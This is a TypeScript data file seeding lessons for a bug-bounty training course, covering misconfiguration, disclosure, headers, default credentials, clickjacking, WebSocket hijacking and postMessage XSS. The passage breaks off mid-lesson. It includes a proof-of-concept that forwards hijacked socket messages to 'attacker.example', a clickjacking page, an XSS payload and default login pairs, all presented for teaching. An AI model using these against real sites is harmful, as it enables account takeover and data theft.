import type { ExerciseSeed, ModuleSeed } from './types';
import { videoSlot } from './types';

export const MODULES: ModuleSeed[] = [
  {
    slug: 'misconfig-and-disclosure',
    title: 'Misconfiguration and Disclosure',
    description:
      'The free findings hiding in plain sight: forgotten config, files that were never meant to be public, and error pages that overshare. By the end you can check the exact paths that leak a `.git` folder, a `.env`, or an open admin panel, read what each one hands you, and judge honestly whether a missing security header is worth reporting at all.',
    lessons: [
      {
        slug: 'security-misconfiguration',
        title: 'Security Misconfiguration',
        summary: 'The app is fine. The way it was set up is not. This is where beginners land their first real finding.',
        estimatedMinutes: 9,
        importance: 'core',
        blocks: [
          {
            type: 'paragraph',
            text:
              'Security misconfiguration is not a bug in the code. It is a bug in the setup - a default left on, a debug page still live, a directory the server happily lists when nobody asked it to. The app can be written perfectly and still bleed information because of one checkbox someone forgot to flip before going live.',
          },
          {
            type: 'paragraph',
            text:
              'Think of a new office that moves in but never changes the lock the builder installed, and leaves the master key hanging by the door. Nothing about the office is broken. The problem is entirely in how it was handed over. Web apps are the same: a framework ships with a debug mode, an example admin login, or directory listing turned on, and the person deploying it never turned those off.',
          },
          {
            type: 'paragraph',
            text:
              'Walk one through. You visit `https://example.com/uploads/` expecting an error, and instead the server prints a bare list of every file in that folder - `invoice-8842.pdf`, `backup.zip`, `db-dump.sql`. That is directory listing left enabled. Nobody linked `db-dump.sql` anywhere; you were never meant to know it existed. But the server was configured to show the contents of any folder without an index page, so it told you. You did not break in - the front door was propped open and labelled.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Directory listing on** - `/uploads/`, `/backups/`, `/files/` print their contents',
              '**Debug mode in production** - stack traces, config values, sometimes a live console',
              '**Default credentials** - `admin` / `admin` still works on a panel',
              '**Sample or setup pages left live** - `/install`, `/setup`, `/phpinfo.php`',
              '**Verbose server headers** - exact software versions that map to known bugs',
              '**Permissive CORS or open cloud storage** - data reachable from anywhere',
            ],
          },
          {
            type: 'command',
            description: 'Check whether a folder lists its contents and whether the server overshares in its headers:',
            commands: [
              'curl -s https://example.com/uploads/ | head -n 20',
              'curl -sI https://example.com/',
            ],
          },
          {
            type: 'paragraph',
            text:
              'The first command asks the server for the `/uploads/` folder and prints the first 20 lines. If you see an HTML page titled "Index of /uploads" with a table of filenames and dates, listing is on - a finding. If you get a `403 Forbidden` or a `404`, it is off. The second command prints only the response headers (`-I`), where a line like `Server: Apache/2.4.29 (Ubuntu)` or `X-Powered-By: PHP/5.6.40` tells an attacker the exact software version to look up known vulnerabilities for. Modern setups hide those; a version-stamped header is a small but real leak.',
          },
          {
            type: 'paragraph',
            text:
              'Why this matters to a hunter: misconfiguration is the most common way a beginner gets a first valid report, because you do not need to craft a payload - you just have to know where to look and what a leaked file is worth. A `db-dump.sql` in an open folder can contain password hashes and personal data; that is a serious finding on its own. In a report you name the exact URL, say what it exposes, and state the impact plainly: "unauthenticated directory listing at `/backups/` exposes a database dump containing user records".',
          },
          {
            type: 'callout',
            variant: 'warning',
            title: 'Found is not the same as accessed',
            text:
              'Seeing that `db-dump.sql` is listed is enough to report. Downloading and opening a file full of real user data can cross a line - note it exists, grab only what proves the point, and never hoard the contents.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Authorised targets only',
            text: 'Poking at config paths and folders counts as testing. Do it only where a program scope or a written agreement says you may.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'You just unlocked',
            text: 'You can spot a misconfigured server - open listings, debug pages, version-leaking headers - which is where most first findings come from.',
          },
          {
            type: 'quiz',
            question: 'A server prints "Index of /backups" with a list of files when you visit that folder. What is this?',
            options: [
              'A SQL injection vulnerability',
              'Directory listing left enabled - a security misconfiguration',
              'A cross-site scripting bug',
              'Normal, expected behaviour for every web server',
            ],
            correctIndex: 1,
            explanation:
              'When a folder has no index page and listing is enabled, the server exposes its contents. That is a misconfiguration, not a code bug.',
          },
        ],
      },
      {
        slug: 'information-disclosure',
        title: 'Information Disclosure',
        summary: 'The app tells you things it should have kept quiet. Half of hacking is just reading carefully.',
        estimatedMinutes: 9,
        importance: 'core',
        blocks: [
          {
            type: 'paragraph',
            text:
              'Information disclosure is when an application hands out details it had no reason to share - internal paths, software versions, usernames, API keys, source code, someone else\'s data. On its own a leak might feel small, but leaks are the fuel for bigger attacks. You rarely start with the winning move; you start by collecting the clues the app leaves lying around.',
          },
          {
            type: 'paragraph',
            text:
              'It is like a courier who reads your full order out loud in a crowded lift - your name, flat number, and that you are not home till 8pm. Each fact seems harmless. Together they are a plan. Apps leak the same way: a version number here, a hidden field there, an error that names the database, and suddenly an attacker knows exactly what to aim at.',
          },
          {
            type: 'heading',
            level: 3,
            text: 'Where the leaks hide',
          },
          {
            type: 'paragraph',
            text:
              'The leaks are almost never on the visible page. They sit in the plumbing: HTTP response headers, HTML comments the developer forgot, JavaScript files that reference internal endpoints, JSON responses that include more fields than the screen shows, and error messages. A classic one - the app returns a user profile as JSON and the screen shows only the name and photo, but the raw JSON also contains `"email"`, `"phone"`, and `"role":"admin"`. The front end hid those fields; the API never did.',
          },
          {
            type: 'command',
            description: 'Pull the raw response and comb it for leaked internals, not just what the page shows:',
            commands: [
              'curl -s https://example.com/api/users/42 | grep -iE "email|phone|token|role|internal"',
              'curl -s https://example.com/ | grep -iE "<!--|api|todo|password"',
            ],
          },
          {
            type: 'paragraph',
            text:
              'The first command fetches a user record and filters for words that signal sensitive fields. If the output shows `"email":"asha@example.com","role":"admin"`, the API is returning data the UI never displays - an over-sharing endpoint worth reporting. The second command downloads the homepage HTML and greps for comment markers (`<!--`) and telltale words; developers regularly leave notes like `<!-- TODO: remove test admin creds -->` or a reference to an internal `api-staging.example.com` right in the page source. Reading the raw response instead of the rendered page is the entire skill here.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Response headers** - `Server`, `X-Powered-By`, custom `X-` headers naming internal systems',
              '**HTML comments** - leftover notes, disabled features, internal hostnames',
              '**JavaScript bundles** - hardcoded API keys, endpoint lists, feature flags',
              '**Over-full API responses** - fields the screen hides but the JSON still sends',
              '**Verbose errors** - stack traces, file paths, database names (its own lesson)',
              '**Metadata** - EXIF in uploaded photos, author names in documents',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Impact ranges from "useful for the next step" to "critical on its own". A leaked software version just narrows an attacker\'s search. A leaked API key or a JSON response exposing every user\'s email is a finding in its own right. When you report, be specific about what leaked, where, and what it enables: "the `/api/users/{id}` endpoint returns the `email` and `role` of any user to an unauthenticated caller" is a clear, actionable report.',
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'The raw response is the real page',
            text:
              'The browser shows you a polished version. The truth is in View Source, the Network tab, and the raw JSON. Train yourself to read those first.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'Level up',
            text: 'You know where apps quietly leak - headers, comments, JS, over-full JSON - and how to read a response instead of just a page.',
          },
          {
            type: 'quiz',
            question: 'A profile page shows only a name, but the raw JSON response also includes the user\'s email and role. What is this?',
            options: [
              'A rendering bug with no security impact',
              'Information disclosure - the API sends more than the UI shows',
              'A cross-site request forgery flaw',
              'Expected, because JSON always includes every field',
            ],
            correctIndex: 1,
            explanation:
              'The UI hiding a field does not protect it. If the API returns sensitive data to a caller who should not see it, that is information disclosure.',
          },
        ],
      },
      {
        slug: 'security-headers',
        title: 'Security Headers That Matter',
        summary: 'These headers make attacks harder. But a missing one, by itself, is rarely a payday - here is the honest version.',
        estimatedMinutes: 8,
        importance: 'core',
        blocks: [
          {
            type: 'paragraph',
            text:
              'Security headers are instructions a server sends the browser about how to behave safely - block this, do not frame that, only load scripts from here. They are genuinely useful defence. But you need the honest truth up front: a scanner flagging a missing header is usually not, on its own, a bug anyone pays for. Knowing which headers matter, and what they must be paired with to become a real finding, is what separates a useful report from noise.',
          },
          {
            type: 'paragraph',
            text:
              'Think of them as the safety rules posted at a society gate: "visitors sign in", "no tailgating", "gate shuts by 10pm". The rules reduce risk. But the absence of a sign is not a break-in - it is only a problem when there is also an actual way for a stranger to walk in. A missing header is the missing sign; you still have to show the open gate it leaves exposed.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Content-Security-Policy** - controls which scripts/styles can load; a strong one blunts XSS',
              '**Strict-Transport-Security (HSTS)** - forces HTTPS, stops downgrade to plain HTTP',
              '**X-Frame-Options / frame-ancestors** - stops the page being framed (clickjacking defence)',
              '**X-Content-Type-Options: nosniff** - stops the browser guessing file types',
              '**Set-Cookie flags** - `HttpOnly`, `Secure`, `SameSite` protect the session cookie',
              '**Referrer-Policy** - limits what URL leaks to other sites',
            ],
          },
          {
            type: 'command',
            description: 'Dump a site\'s headers and read which protections are present or absent:',
            commands: ['curl -sI https://example.com/ | grep -iE "content-security|strict-transport|x-frame|x-content-type|set-cookie"'],
          },
          {
            type: 'paragraph',
            text:
              'This prints only the security-relevant headers. If `Strict-Transport-Security` is present, the browser will refuse plain HTTP to this site - good. If `X-Frame-Options` is missing, the page can potentially be framed, which matters only if you can then build a working clickjacking attack on a sensitive action. If `Set-Cookie` shows a session cookie without `HttpOnly`, that cookie is readable by JavaScript - which becomes serious the moment you also find an XSS. Read the output as a list of what is and is not defended, then ask "what does each gap actually enable here?".',
          },
          {
            type: 'paragraph',
            text:
              'That last question is the whole point. A missing `X-Frame-Options` is a finding when you pair it with a real clickjacking PoC on an action that matters (change email, transfer funds). A session cookie missing `HttpOnly` is a finding when you pair it with an XSS that reads it. On its own, most missing headers are "informational" and triagers close them as duplicates or non-issues. Report the gap plus the attack it unlocks, not the gap alone.',
          },
          {
            type: 'callout',
            variant: 'warning',
            title: 'A missing header is a starting point, not a report',
            text:
              'Submitting "your site is missing CSP" with no demonstrated impact is the fastest way to get marked informational. Pair it with the concrete attack it enables, or hold it.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'Locked in',
            text: 'You know the headers that matter, how to read which are missing, and - crucially - that a gap only becomes a payout when you show what it unlocks.',
          },
          {
            type: 'related_lesson',
            lessonSlug: 'clickjacking',
            title: 'Where a missing X-Frame-Options becomes a real bug',
          },
          {
            type: 'quiz',
            question: 'A site is missing the X-Frame-Options header. When does this become a reportable finding?',
            options: [
              'Always - a missing header is automatically a bug',
              'Never - headers are cosmetic',
              'When you can pair it with a working clickjacking attack on a sensitive action',
              'Only if the site also uses HTTP',
            ],
            correctIndex: 2,
            explanation:
              'A missing header alone is usually informational. It becomes a finding when combined with a demonstrated attack, such as clickjacking a meaningful action.',
          },
        ],
      },
      {
        slug: 'default-credentials-and-panels',
        title: 'Default Creds and Exposed Panels',
        summary: 'Someone shipped the product with the factory password still set. You just have to find the login.',
        estimatedMinutes: 8,
        importance: 'core',
        blocks: [
          {
            type: 'paragraph',
            text:
              'A shocking amount of gear and software ships with a built-in username and password - `admin` / `admin`, `root` / `root`, a printed default on a sticker - and a shocking amount of it never gets changed. Combine that with an admin panel that is reachable from the internet, and you have one of the simplest high-impact findings there is: log in as an administrator without breaking anything.',
          },
          {
            type: 'paragraph',
            text:
              'It is the hotel room where housekeeping never changed the safe from the factory code `0000`. The safe works perfectly. The lock is strong. But everyone who read the manual knows the default, and nobody set a new one. Software panels - routers, dashboards, database tools, CCTV systems - are full of `0000`s that were never changed after install.',
          },
          {
            type: 'paragraph',
            text:
              'The finding has two halves, and you need both. First, the panel must be exposed - a login page for an admin tool that should have been locked to an internal network is instead answering on the public internet. Second, the credentials must be default or trivially guessable. Walk it: you find `https://example.com/admin/` returns a login form for a known dashboard product. You look up that product\'s documented default login, enter it once, and you are inside the admin. That single successful login, on an authorised target, is the proof.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Common panel paths** - `/admin`, `/administrator`, `/manager`, `/dashboard`, `/wp-admin`, `/phpmyadmin`',
              '**Classic default pairs** - `admin/admin`, `admin/password`, `root/toor`, `admin/changeme`',
              '**Vendor defaults** - documented in the product manual, often unchanged after install',
              '**Setup wizards left live** - `/install` that lets you create a new admin',
              '**Exposed device panels** - routers, printers, cameras, NAS boxes on public IPs',
            ],
          },
          {
            type: 'command',
            description: 'Check whether a common admin path exists before you ever try a password:',
            commands: ['curl -sI https://example.com/admin/', 'curl -s https://example.com/admin/ | grep -iE "login|username|password"'],
          },
          {
            type: 'paragraph',
            text:
              'The first command asks only for the headers of `/admin/`. A `200` or a `302` redirect to a login means the panel is there; a `404` means it is not. The second downloads the page and greps for login-form words - if you see `password` and `username` fields, you have found an admin login surface. Finding the panel is recon; you only try a credential where you are authorised, and you try the documented default exactly once rather than hammering the form (that crosses into brute-force, a different lesson and a different risk).',
          },
          {
            type: 'paragraph',
            text:
              'Impact is straight to the top: a working admin login is usually full control of the application - read all data, change settings, sometimes upload code. In a report you state the panel URL, that it is reachable without a VPN or internal network, and that the default credentials granted administrator access. You do not need to do anything beyond logging in once to prove it - and you should not.',
          },
          {
            type: 'callout',
            variant: 'warning',
            title: 'One try, then stop',
            text:
              'Trying the one documented default is a check. Cycling through dozens of guesses is brute-forcing a live login - noisy, often out of scope, and it can lock out real users.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Only where you are allowed',
            text: 'Logging into a panel that is not yours is unauthorised access even if the password was "admin". Confirm scope in writing before you touch the login.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'You just unlocked',
            text: 'You can find an exposed admin panel and recognise when a default credential turns it into a critical finding.',
          },
          {
            type: 'practice_ref',
            title: 'Misconfiguration and Disclosure check',
            exerciseSlug: 'misconfig-and-disclosure-quiz',
          },
          {
            type: 'quiz',
            question: 'You find a public admin panel and the documented vendor default login works on the first try. Why is this high impact?',
            options: [
              'It proves the site has XSS',
              'A working admin login usually means full control of the application',
              'It only affects the login page and nothing else',
              'It is low impact because you guessed the password',
            ],
            correctIndex: 1,
            explanation:
              'Administrator access typically grants control over data and settings for the whole app, which is why exposed panels with default creds score critically.',
          },
        ],
      },
      {
        slug: 'verbose-errors-and-stack-traces',
        title: 'Verbose Errors and Stack Traces',
        summary: 'When an app crashes, it sometimes spills its guts - file paths, queries, versions. Read the crash, not just the page.',
        estimatedMinutes: 7,
        importance: 'optional',
        blocks: [
          {
            type: 'paragraph',
            text:
              'A stack trace is the detailed crash report a program prints when something goes wrong - the exact file, the line number, the function chain, sometimes the database query that failed. It is a gift to a developer debugging locally. Left on in production and shown to a stranger, it is a map of the app\'s insides handed to an attacker.',
          },
          {
            type: 'paragraph',
            text:
              'Picture a shopkeeper who, when a bill does not add up, reads their entire private ledger aloud - supplier names, cost prices, the safe combination they use as a memo. The customer only asked why the total was wrong. Verbose errors do exactly that: you send one malformed request and the app answers with far more than "something went wrong".',
          },
          {
            type: 'paragraph',
            text:
              'How you trigger them: give the app input it does not expect and watch how it fails. Put a quote where a number should go, send text to a numeric field, request a resource that cannot exist. A well-built app returns a clean generic message. A misconfigured one returns the raw exception. Walk it: you request `example.com/product?id=abc` where `id` should be a number. Instead of "invalid product", the response is a full trace showing `/var/www/app/models/Product.php line 88`, a MySQL error, and the query `SELECT * FROM products WHERE id = abc`.',
          },
          {
            type: 'command',
            description: 'Send unexpected input and read what the failure reveals:',
            commands: ["curl -s 'https://example.com/product?id=abc'", "curl -s 'https://example.com/product?id=1%27'"],
          },
          {
            type: 'paragraph',
            text:
              'The first request sends letters where a number is expected; the second appends a URL-encoded single quote (`%27`) to break a string. If either response contains a file path like `/var/www/app/...`, a line number, a framework name and version, or a database error naming a table, the app is leaking through its errors. The MySQL error and the echoed query in that trace are especially loud: they confirm the backend is MySQL, reveal a real table name (`products`), and hint the `id` value lands in a query unescaped - a strong lead toward SQL injection.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**File paths** - `/var/www/`, `C:\\inetpub\\` reveal the OS and app layout',
              '**Framework and version** - names a known set of bugs to look up',
              '**Database errors** - confirm the engine and expose table/column names',
              '**Echoed queries** - a leaked SQL string is a signpost to injection',
              '**Internal hostnames** - staging servers, internal APIs named in the trace',
            ],
          },
          {
            type: 'paragraph',
            text:
              'On its own a verbose error is usually a low-to-medium finding - it discloses internals rather than directly compromising anything. Its real value is as a lead: the query in the trace points at SQL injection, the version points at a known CVE, the path helps a later file-read bug. Report it as information disclosure, quote the exact leaked details, and note what deeper test it enabled.',
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'A crash is a conversation',
            text:
              'Do not skim past an error page. Read every line - the app is telling you what it is built from and, often, where its next bug lives.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Testing only where permitted',
            text: 'Deliberately breaking inputs to force errors is active testing. Keep it to targets whose scope allows it.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'Level up',
            text: 'You can force an app to reveal itself through its errors and read a stack trace for the leads it hands you.',
          },
          {
            type: 'quiz',
            question: 'A malformed request returns a stack trace with a file path, the MySQL engine, and the failing SQL query. Beyond the disclosure itself, what is the most useful next lead?',
            options: [
              'That the site is missing an HSTS header',
              'That the echoed query and database error point toward possible SQL injection',
              'That the site is vulnerable to clickjacking',
              'Nothing - a stack trace is only cosmetic',
            ],
            correctIndex: 1,
            explanation:
              'The leaked query and DB error reveal the backend and a real table, and suggest input reaches the query unescaped - a strong pointer toward SQL injection.',
          },
        ],
      },
    ],
  },
  {
    slug: 'client-side-extras',
    title: 'Client-Side Extras',
    description:
      'The browser-side bugs testers skip because no scanner shouts about them: tricking a user into clicking an invisible button, hijacking a live socket, and abusing the messages one window sends another. By the end you can build a working clickjacking proof, spot a WebSocket that trusts the wrong origin, and read a `postMessage` handler for the missing check that lets any site talk to it.',
    lessons: [
      {
        slug: 'clickjacking',
        title: 'Clickjacking',
        summary: 'The victim thinks they are clicking a game button. They are actually clicking "delete my account" on a page they cannot see.',
        estimatedMinutes: 8,
        importance: 'core',
        blocks: [
          {
            type: 'paragraph',
            text:
              'Clickjacking is stacking one page invisibly on top of another so a user who thinks they are clicking your harmless button is really clicking a sensitive action on a site they are logged into. The real page is loaded in a transparent frame, floated over a decoy, and lined up so the button the user aims at sits exactly under the action you want triggered.',
          },
          {
            type: 'paragraph',
            text:
              'Picture a glass door held open in front of a real door. You see "Tap to win a Swiggy voucher" and tap it. Your finger actually passes through the glass and presses "Confirm transfer" on your bank page behind it. You never saw the second door because it was clear, but your click landed on it. That is clickjacking - your intent aimed at one thing, your click delivered to another.',
          },
          {
            type: 'paragraph',
            text:
              'Walk the mechanism. You build an attacker page. In it you place an `iframe` pointing at the target action - say `https://example.com/account/delete`, which triggers on a single button click when the victim is logged in. You set that iframe to `opacity: 0` so it is invisible, size and position it so its delete button sits over your own big "Claim reward" button, and put your decoy underneath. The victim, already logged into `example.com` in the same browser, opens your page, clicks "Claim reward", and the click lands on the real (invisible) delete button. Their session cookie rides along automatically, so the server sees a legitimate authenticated request.',
          },
          {
            type: 'code',
            language: 'html',
            filename: 'clickjack-poc.html',
            code:
              '<style>\n  iframe { position: absolute; top: 0; left: 0; width: 800px; height: 600px; opacity: 0; z-index: 2; }\n  button { position: absolute; top: 300px; left: 250px; z-index: 1; }\n</style>\n<button>Claim your reward</button>\n<iframe src="https://example.com/account/settings"></iframe>',
          },
          {
            type: 'paragraph',
            text:
              'Read what this proof does. The `iframe` loads the real settings page and `opacity: 0` makes it fully transparent; `z-index: 2` puts it *above* the visible button so clicks hit the frame first. You then nudge `top`/`left` until the frame\'s dangerous control sits over your decoy. If the target page loads inside your frame at all, you already have half the finding - a site that can be framed is a site that can be clickjacked. If instead the frame stays blank and the browser console shows a "refused to display ... in a frame" message, the site set framing protection and the attack is dead. That single load-or-refuse result is your first test.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**The defence** - `X-Frame-Options: DENY` or a CSP `frame-ancestors \'none\'` tells the browser never to frame the page',
              '**The test** - try to load the target in an `iframe`; if it renders, framing is allowed',
              '**Needs a state-changing action** on a single click (delete, transfer, change email) to matter',
              '**Only works while the victim is logged in** - the frame reuses their existing session',
              '**Not a bug on a read-only page** - framing a public article changes nothing',
            ],
          },
          {
            type: 'paragraph',
            text:
              'This is the lesson where a "missing header" finally becomes a real bug. A missing `X-Frame-Options` on a public marketing page is nothing. The same gap on `/account/delete` or a one-click money transfer, with a working proof that lines the invisible button up over a decoy, is a genuine clickjacking finding. In the report you show the framed page, name the sensitive action, and state the impact: "an attacker page can frame `/account/settings` and trick a logged-in user into changing their email in one click", which then enables a password-reset takeover.',
          },
          {
            type: 'callout',
            variant: 'warning',
            title: 'Frameable is not the finding - the action is',
            text:
              'A page that can be framed only matters if a single click on it does something dangerous. Always tie your proof to a real state-changing action, or a triager will close it as informational.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Only your own targets',
            text: 'Framing a live site and luring real users to click is a real attack on real people. Build and test the proof only against a target you are authorised to test.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'You just unlocked',
            text: 'You can test whether a page is frameable and turn that into a working clickjacking proof against an action that actually matters.',
          },
          {
            type: 'related_lesson',
            lessonSlug: 'security-headers',
            title: 'The header that stops this',
          },
          {
            type: 'quiz',
            question: 'A page can be loaded inside your iframe. When is this actually a clickjacking finding?',
            options: [
              'Always - any frameable page is a bug',
              'Only when the framed page has a single-click action worth hijacking, like delete or transfer',
              'Only if the page uses HTTP instead of HTTPS',
              'Never - framing is normal and harmless',
            ],
            correctIndex: 1,
            explanation:
              'Framing only matters when a single click triggers a sensitive, state-changing action. Framing a read-only page changes nothing.',
          },
        ],
      },
      {
        slug: 'websocket-security',
        title: 'WebSocket Security',
        summary: 'Most sites bolt authentication onto the first request, then trust the open pipe forever. That gap is where the bugs live.',
        estimatedMinutes: 9,
        importance: 'core',
        blocks: [
          {
            type: 'paragraph',
            text:
              'A WebSocket is a two-way pipe kept open between the browser and the server, used for live things - chat, notifications, a trading ticker. Unlike a normal request-and-reply, once the pipe is open both sides can send messages any time. That always-on nature is exactly what testers forget to check: the security applied to the opening handshake often is not re-checked on the messages that flow afterwards.',
          },
          {
            type: 'paragraph',
            text:
              'Think of a normal HTTP request as posting a letter - each envelope is checked at the gate. A WebSocket is more like a phone call that stays connected: the watchman verifies you once when the call connects, then leaves the line open. If he never checks who is really talking after that, anyone who can get onto the line can say anything.',
          },
          {
            type: 'heading',
            level: 3,
            text: 'The headline bug: cross-site hijacking',
          },
          {
            type: 'paragraph',
            text:
              'The connection starts as a normal HTTP request with an `Upgrade: websocket` header, and crucially the browser sends the user\'s cookies with it - just like any other request to that site. So if the server decides "you are allowed to open this socket" based only on the session cookie, and does not check the `Origin` header, then any website can open a socket to the target as the logged-in victim. This is Cross-Site WebSocket Hijacking (CSWSH): it is CSRF, but for the whole socket.',
          },
          {
            type: 'code',
            language: 'javascript',
            filename: 'cswsh-poc',
            code:
              '// Hosted on attacker.example, run in a victim who is logged into example.com\nconst ws = new WebSocket("wss://example.com/chat");\nws.onopen = () => ws.send(JSON.stringify({ action: "history" }));\nws.onmessage = (e) => fetch("https://attacker.example/steal", { method: "POST", body: e.data });',
          },
          {
            type: 'paragraph',
            text:
              'Read what happens line by line. The victim, logged into `example.com`, visits the attacker\'s page. `new WebSocket("wss://example.com/chat")` makes the browser open the socket, and because it is a request to `example.com`, the browser attaches the victim\'s session cookie automatically. If the server checks only that cookie and ignores `Origin`, the socket opens as the victim. The attacker then sends `{"action":"history"}`, the server streams back the victim\'s private chat history, and `onmessage` forwards every message to the attacker\'s server. If instead the socket refuses to open or closes immediately, check the handshake response - a server that validates `Origin` rejects the connection, and there is no bug.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**wss://** is the encrypted WebSocket (like HTTPS); **ws://** is plaintext',
              '**Origin header** - the one check that stops CSWSH; its absence is the core flaw',
              '**Cookies auto-attach** to the handshake, which is why it behaves like CSRF',
              '**Per-message authorisation** - is each message re-checked, or is the open pipe trusted blindly?',
              '**Inspect it in Burp** - the WebSockets history tab shows every frame in both directions',
            ],
          },
          {
            type: 'paragraph',
            text:
              'For impact, describe what flows through the pipe. A hijacked chat socket leaks private conversations; a hijacked notifications socket can leak account details or let the attacker send actions as the victim. The report needs three facts: that the handshake succeeds from a foreign origin (paste the request showing no `Origin` validation), what messages the socket exposes, and whether the attacker can send state-changing messages, not just read.',
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'The handshake is HTTP - inspect it there',
            text:
              'A WebSocket opens with an ordinary HTTP request. Catch that request in your proxy and check whether the server validates the `Origin` header before upgrading.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Authorised sockets only',
            text: 'Opening a socket as another user and reading their messages is unauthorised access. Test only where the scope allows it.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'Level up',
            text: 'You understand why an always-open socket is risky and how a missing Origin check turns into cross-site WebSocket hijacking.',
          },
          {
            type: 'practice_ref',
            title: 'Client-Side Extras check',
            exerciseSlug: 'client-side-extras-quiz',
          },
          {
            type: 'quiz',
            question: 'What makes Cross-Site WebSocket Hijacking possible?',
            options: [
              'The socket uses plaintext ws:// instead of wss://',
              'The server authorises the connection on the auto-sent cookie without validating the Origin header',
              'The victim clicks a malicious link inside the chat',
              'The WebSocket protocol is inherently broken',
            ],
            correctIndex: 1,
            explanation:
              'Cookies attach to the handshake automatically. If the server trusts that cookie and never checks Origin, any site can open the socket as the victim.',
          },
        ],
      },
      {
        slug: 'postmessage-and-window-attacks',
        title: 'postMessage and Window Attacks',
        summary: 'One window can send messages to another. If the receiver never checks who sent it, any site can talk to it.',
        estimatedMinutes: 8,
        importance: 'optional',
        blocks: [
          {
            type: 'paragraph',
            text:
              '`postMessage` is the official way for two browser windows or frames from different sites to talk to each other - a page and the payment iframe it embeds, a widget and its host. It exists because the browser normally blocks cross-origin windows from touching each other. The bug is almost never `postMessage` itself; it is a receiver that reads incoming messages without checking who sent them or what is inside.',
          },
          {
            type: 'paragraph',
            text:
              'It is like a building intercom. A flat can buzz open the main gate when someone presses their button. That is fine if the resident checks who is at the gate first. It goes wrong when the flat buzzes the gate open for anyone who presses, without asking who it is. A `postMessage` receiver that does not verify the sender is a flat that opens the gate for every stranger.',
          },
          {
            type: 'paragraph',
            text:
              'The mechanism is a listener. A page registers `window.addEventListener("message", handler)`, and the handler runs for every message that arrives - from a legitimate embedded frame or from a malicious page that opened this one in a popup. Two checks decide whether it is safe: does the handler verify `event.origin` is the expected site, and does it treat `event.data` as untrusted? When both are missing, an attacker page sends a message and the handler acts on it.',
          },
          {
            type: 'code',
            language: 'javascript',
            filename: 'vulnerable-listener',
            code:
              '// On example.com - no origin check, and data flows into a dangerous sink\nwindow.addEventListener("message", (event) => {\n  document.getElementById("box").innerHTML = event.data;\n});',
          },
          {
            type: 'paragraph',
            text:
              'Walk the exploit. The attacker opens `example.com` in a popup or iframe they control, then runs `target.postMessage("<img src=x onerror=alert(document.domain)>", "*")`. On `example.com` the listener fires, never checks `event.origin`, and drops `event.data` straight into `innerHTML` - a sink that parses HTML. The `<img>` fails to load, its `onerror` runs, and the domain pops: a DOM XSS reached entirely through `postMessage`. Read the two failures: the missing `if (event.origin !== "https://trusted.example") return;` guard, and the unsafe `innerHTML` sink. Fix either and the bug closes. If the handler does check origin, your message is ignored and there is nothing here.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**event.origin** - the sender\'s origin; a safe handler checks it against an allowlist first',
              '**event.data** - the payload; treat it as untrusted input, never drop it into a sink',
              '**The `"*"` target** - a sender using `postMessage(data, "*")` will deliver to any origin, leaking data too',
              '**Find handlers** - search the JavaScript for `addEventListener("message"` or `onmessage`',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Impact depends on what the handler does with the message. Into `innerHTML` or `eval`, it is XSS. Into a function that changes account state, it is a cross-origin action trigger. Even a handler that only *reads* can leak: a page that replies to any message with a token hands that token to whichever origin asked. Report the exact listener, the missing origin check, and the sink or data leak the message reaches.',
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'Grep for the listener first',
            text:
              'The whole bug lives in one function. Search the site\'s JavaScript for `addEventListener("message"` and read whether it checks `event.origin` before using `event.data`.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Only where authorised',
            text: 'Sending crafted messages into another site\'s handlers is active testing. Keep it to targets whose scope permits it.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'Locked in',
            text: 'You can find a postMessage handler and judge whether a missing origin check lets any site drive it.',
          },
          {
            type: 'related_lesson',
            lessonSlug: 'dom-xss',
            title: 'The sink side of this bug',
          },
          {
            type: 'quiz',
            question: 'A page has window.addEventListener("message", ...) that writes event.data into innerHTML. What is the core flaw?',
            options: [
              'postMessage is insecure and should never be used',
              'The handler does not verify event.origin and feeds untrusted data into a dangerous sink',
              'The page uses an iframe',
              'The message is sent over HTTP',
            ],
            correctIndex: 1,
            explanation:
              'A safe handler checks event.origin against an allowlist and treats event.data as untrusted. Missing both turns postMessage into an XSS route.',
          },
        ],
      },
      {
        slug: 'prototype-pollution',
        title: 'Prototype Pollution',
        summary: 'Change one shared blueprint every object copies from, and suddenly every object in the app carries your value.',
        estimatedMinutes: 9,
        importance: 'optional',
        blocks: [
          {
            type: 'paragraph',
            text:
              'Prototype pollution is a JavaScript-specific bug where an attacker sets a property on the object that almost every other object inherits from. In JavaScript, objects share a common blueprint called the prototype; if you can write to that shared blueprint, your value silently appears on objects all over the app that never asked for it. It sounds abstract, but it turns into real bugs - denied logins, changed behaviour, sometimes a path to code execution.',
          },
          {
            type: 'paragraph',
            text:
              'Think of a society where every new flat is furnished by copying one master show-flat. Change the show-flat - say, add a poster to its wall - and every flat furnished afterward has that poster, because they all copied from the same template. Prototype pollution edits the show-flat. You touch one shared blueprint and the change ripples into objects everywhere.',
          },
          {
            type: 'paragraph',
            text:
